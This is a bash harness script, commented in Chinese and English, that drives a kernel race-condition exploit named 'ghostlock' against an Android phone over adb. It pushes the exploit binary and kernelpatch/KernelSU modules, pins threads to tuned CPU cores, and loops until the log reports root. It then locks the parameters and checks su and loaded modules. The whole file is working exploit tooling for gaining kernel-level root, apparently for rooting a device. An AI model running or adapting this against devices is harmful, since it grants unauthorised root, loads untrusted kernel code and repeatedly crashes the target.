#!/bin/bash
# GhostLock TUNE / USE 模式运行器。
#
#   MODE=tune（默认）：探索 + 锁参。success → 把参数写进 gl_tuned.env 并立刻停止验证。
#   MODE=use         ：读取已锁定的 gl_tuned.env 复跑（不再覆盖它）。
#
# 三分类结果：
#   * success      -> 命中（写 gl_tuned.env、验证模块与 APatch、break）
#   * panic        -> fired but died（设备重启），累计统计，继续下一轮
#   * safe-no-fire -> 参数没生效，继续
# 已知：目前只有 GHOSTLOCK_SHIFT=-2 会 fire；fire 后多数 panic；命中约 5–8%/轮。
#
# 配置与设备/路径不再写在本文件里：
#   * 设备、目录、产物路径     ← env.sh（自动探测，可用配置覆盖）
#   * 平台差异、NDK 探测       ← platform.sh
#   * exploit 开关、轮数、偏移 ← config.sh（L0 CLI/env > L1 harness.local.env > L3 默认）
# 用法: bash tools/harness/run.sh [--mode tune|use] [--rounds N] [--shift N]
#        [--device 序列号] [--dry-run] [--print-config] [--help]
set -uo pipefail

_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=./env.sh
. "${_dir}/env.sh"
# shellcheck source=./config.sh
. "${_dir}/config.sh"

config_init "$@" || exit 1
require_dev || exit 1

# SHIFT / ROUNDS / REBOOT_EVERY / exploit 开关 的默认值与校验都在 config.sh（唯一来源）
GL_OWNER="${GL_OWNER:-${OWNER:-}}"

# 核心对：这个漏洞是两线程竞态，命中依赖时序窗口对齐，而窗口精度受核心频率影响。
# marble（SM7475）实测对照（各从重启后新鲜状态起步）：
#   CORE=0 CCORE=1（1.80GHz 小核）→ 8 轮全 PANIC，0 命中
#   CORE=4 CCORE=5（2.50GHz 中核）→ 第 1 轮即 SUCCESS
# 故默认自动探测频率最高的**同簇**两个核心（走 adb 读设备，本机的 /sys 不存在）；
# 探测不到就退回 4/5，最后 0/1。显式设置 CORE/CCORE 则不探测。
detect_core_pair() {
    [ -n "${DEV:-}" ] || { echo "4 5"; return; }
    local line
    line=$(tmo 20 adb -s "$DEV" shell \
        'for d in /sys/devices/system/cpu/cpu[0-9]*; do
             [ -r "$d/cpufreq/cpuinfo_max_freq" ] || continue
             echo "$(cat $d/cpufreq/cpuinfo_max_freq 2>/dev/null) $(basename $d | sed s/cpu//)"
         done' 2>/dev/null | tr -d '\r' | sort -k1,1nr -k2,2n)
    [ -n "$line" ] || { echo "4 5"; return; }

    # 按频率分组，取**成员 >= 2 的最高频簇**，用它的前两个核心。
    # 为什么不直接取最高频核心：最高频那档常常是单核簇（如 cpu7 独占 2.9GHz），
    # 两个线程跨簇跑会引入调度迁移抖动，而本漏洞恰恰依赖两线程的时序对齐。
    local pair="" f seq
    for f in $(printf '%s\n' "$line" | awk '{print $1}' | uniq); do
        seq=$(printf '%s\n' "$line" | awk -v f="$f" '$1 == f {print $2}')
        if [ "$(printf '%s\n' "$seq" | wc -l | tr -d ' ')" -ge 2 ]; then
            pair=$(printf '%s\n' "$seq" | head -2 | tr '\n' ' ')
            break
        fi
    done
    [ -n "$pair" ] || pair="4 5"
    printf '%s\n' "$pair" | awk '{print $1, $2}'
}

if [ -z "${CORE:-}" ] || [ -z "${CCORE:-}" ]; then
    _pair="$(detect_core_pair)"
    CORE=${CORE:-$(printf '%s' "$_pair" | awk '{print $1}')}
    CCORE=${CCORE:-$(printf '%s' "$_pair" | awk '{print $2}')}
    unset _pair
fi
CORE=${CORE:-0}
CCORE=${CCORE:-1}

EXPLOIT_ENV="$(config_exploit_env)"
PANIC=0; SAFE=0; HIT=0

stage() {
  for i in $(seq 1 60); do
    st=$(adb -s "$DEV" shell 'echo ok' 2>/dev/null | tr -d '\r'); [ "$st" = "ok" ] && break; sleep 3
  done
  for i in $(seq 1 40); do
    bc=$(adb -s "$DEV" shell 'getprop sys.boot_completed' 2>/dev/null | tr -d '\r'); [ "$bc" = "1" ] && break; sleep 3
  done
  sleep 2
  EXPECT_BIN=$(md5_of "$BIN")
  EXPECT_KO=$(md5_of "$KO")
  for i in $(seq 1 8); do
    adb -s "$DEV" push "$BIN" "$D_TMP/ghostlock" >/dev/null 2>&1
    adb -s "$DEV" push "$KO" "$D_TMP/kernelpatch.ko" >/dev/null 2>&1
    # KernelSU route is deliberately NOT staged this round. The root script
    # gives ksud+kernelsu.ko priority over the APatch branch, and kernelsu.ko
    # has never been loaded on this device, while kernelpatch.ko has (kmsg x3).
    # Leaving them present would send the one usable hit down the unverified
    # path. Remove leftovers instead of pushing them.
    adb -s "$DEV" shell "rm -f $D_TMP/kernelsu.ko $D_TMP/ksud" >/dev/null 2>&1
    # durable copies on /sdcard: /data/local/tmp rolls back on every reboot,
    # and the root script may run only after that reboot (measured ENOENT).
    adb -s "$DEV" shell "mkdir -p $D_SDCARD/ghostlock_ko" >/dev/null 2>&1
    adb -s "$DEV" push "$KO" "$D_SDCARD/ghostlock_ko/kernelpatch.ko" >/dev/null 2>&1
    adb -s "$DEV" push "$KSUN_KO" "$D_SDCARD/ghostlock_ko/kernelsu.ko" >/dev/null 2>&1
    adb -s "$DEV" push "$KSUD_BIN" "$D_SDCARD/ghostlock_ko/ksud" >/dev/null 2>&1
    adb -s "$DEV" shell "chmod 755 $D_TMP/ghostlock; chmod 644 $D_TMP/kernelpatch.ko" 2>/dev/null
    sleep 5
    got=$(adb -s "$DEV" shell "md5sum $D_TMP/ghostlock $D_TMP/kernelpatch.ko" 2>/dev/null | cut -d' ' -f1 | tr '\n' ' ')
    case "$got" in
      "$EXPECT_BIN $EXPECT_KO "*) echo "stage ok (round verified after rollback window)"; return 0 ;;
    esac
    echo "stage retry $i: got [$got]"
    sleep 4
  done
  return 1
}

echo "=== MODE=$MODE rounds=$ROUNDS shift=$SHIFT core=$CORE/$CCORE $(date +%H:%M:%S) ==="
[ -n "${CONFIG_LOCAL_ENV:-}" ] && echo "--- 本地配置: $CONFIG_LOCAL_ENV"
[ -n "${CONFIG_TUNED_ENV:-}" ] && echo "--- 锁定参数: $CONFIG_TUNED_ENV"
echo "--- 设备命令: cd $D_TMP && $EXPLOIT_ENV ./ghostlock"

if [ "$DRY_RUN" = 1 ]; then
  echo "--- DRY-RUN：以下为将要推送/执行的命令，未实际执行 ---"
  echo "push $BIN -> $D_TMP/ghostlock"
  echo "push $KO -> $D_TMP/kernelpatch.ko"
  echo "push $KO -> $D_SDCARD/ghostlock_ko/kernelpatch.ko"
  echo "push $KSUN_KO -> $D_SDCARD/ghostlock_ko/kernelsu.ko"
  echo "push $KSUD_BIN -> $D_SDCARD/ghostlock_ko/ksud"
  echo "adb -s $DEV shell \"cd $D_TMP && $EXPLOIT_ENV ./ghostlock\"   (超时 400s, 共 $ROUNDS 轮)"
  exit 0
fi

for r in $(seq 1 $ROUNDS); do
  # Fresh-state upkeep: measured on-device, W1 survival collapses from ~25%
  # (right after boot) to ~7% after a long run of panics/oopses, and W2
  # tracks it. Reboot every REBOOT_EVERY rounds to stay inside the fresh
  # window. Cost ~45s vs. the ~3.5x survival gain.
  # Periodic reboots are redundant: a panic already warm-resets the device
  # every round, which is what used to "refresh" it. REBOOT_EVERY<=0 disables
  # the extra reboot (guard against modulo-by-zero).
  if [ "${REBOOT_EVERY:-0}" -gt 0 ] && [ $r -gt 1 ] && [ $(( (r - 1) % ${REBOOT_EVERY:-3} )) -eq 0 ]; then
    echo "--- periodic reboot (round $r) to restore fresh state ---"
    adb -s "$DEV" reboot >/dev/null 2>&1
    sleep 50
  fi
  u0=$(adb -s "$DEV" shell 'cat /proc/uptime' 2>/dev/null | cut -d' ' -f1)
  echo "=== TUNE round $r/$ROUNDS shift=$SHIFT core=$CORE/$CCORE uptime=${u0:-?} $(date +%H:%M:%S) ==="
  stage || { echo "stage failed; waiting for next boot"; sleep 20; continue; }
  tmo 400 adb -s "$DEV" shell "cd $D_TMP && $EXPLOIT_ENV ./ghostlock" > "$LOGDIR/gl_tune_r${r}.log" 2>&1
  echo "ADB_EXIT=$?" >> "$LOGDIR/gl_tune_r${r}.log"
  u=$(adb -s "$DEV" shell 'cat /proc/uptime' 2>/dev/null | cut -d' ' -f1)
  if grep -qE "child is root!|self is root" "$LOGDIR/gl_tune_r${r}.log"; then
    HIT=$((HIT+1))
    if [ "$MODE" = tune ]; then
      echo "SHIFT=$SHIFT CORE=$CORE CCORE=$CCORE DATE=$(date +%F\ %T)" > "$TUNED"
      echo "=== SUCCESS (hit $HIT) — params locked to $TUNED; verifying module + APatch ==="
    else
      echo "=== SUCCESS (hit $HIT) — USE 模式（$TUNED 未改动）；verifying module + APatch ==="
    fi
    sleep 8
    echo "--- /proc/modules ---"
    adb -s "$DEV" shell 'grep -E "kernelsu|kernelpatch" /proc/modules 2>/dev/null || echo "(none)"'
    echo "--- klog (in-process loader diagnostics) ---"
    adb -s "$DEV" shell "cat $D_SDCARD/ghostlock_klog 2>/dev/null || cat $D_TMP/.ghostlock_klog 2>/dev/null || echo '(no klog)'"
    echo "--- su (kpatch sucompat should answer immediately) ---"
    adb -s "$DEV" shell 'su -c id 2>&1 | head -3'
    echo "--- root worker marker ---"
    adb -s "$DEV" shell "ls -la $D_TMP/.ghostlock_root_alive 2>/dev/null || echo '(none)'"
    break
  elif [ -z "$u" ]; then
    PANIC=$((PANIC+1)); echo "result: PANIC (fired, died) — cumulative panic=$PANIC safe=$SAFE hit=$HIT"
  else
    SAFE=$((SAFE+1)); echo "result: SAFE-NO-FIRE (survived, no write) — panic=$PANIC safe=$SAFE hit=$HIT"
  fi
  sleep 2
done
echo "=== TUNE done: hit=$HIT panic=$PANIC safe=$SAFE over $ROUNDS rounds $(date +%H:%M:%S) ==="
